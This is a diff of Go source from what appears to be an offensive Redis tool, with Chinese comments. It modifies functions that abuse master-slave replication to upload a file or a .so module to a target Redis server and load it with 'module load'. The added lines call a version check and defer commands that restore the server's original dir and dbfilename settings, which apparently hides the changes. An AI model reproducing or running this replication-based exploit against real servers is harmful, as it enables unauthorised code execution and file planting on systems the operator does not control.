@@ -10,6 +10,7 @@ import (
 
 // RedisSlave 开启主从复制
 func RedisSlave(lhost, lport, dir, dbfilename string) {
+	RedisVersion(false)
 	var payload []byte
 	if strings.Contains(dbfilename, ".so") {
 		payload = SoPayload
@@ -34,6 +35,9 @@ func RedisSlave(lhost, lport, dir, dbfilename string) {
 
 	load := fmt.Sprintf("module load %v/%v", dir, dbfilename)
 	RunRedisCmd(load)
+
+	defer RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
+	defer RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))
 
 }
 
@@ -69,6 +73,7 @@ func CloseSlave(dll string) {
 
 // RedisUpload 主从复制上传文件
 func RedisUpload(lhost, lport, rpath, rfile, lfile string) {
+	RedisVersion(false)
 	// 判断文件大小，发现个Redis  Bug 小于9个字节可能会把 Redis 给打崩
 	fi, err := os.Stat(lfile)
 	if err != nil {
@@ -106,6 +111,9 @@ func RedisUpload(lhost, lport, rpath, rfile, lfile string) {
 
 	fmt.Printf("[OK]\t%v uploaded successfully\n", rfile)
 
-	CloseSlave("")
+	defer CloseSlave("")
+
+	defer RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
+	defer RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))
 
 }
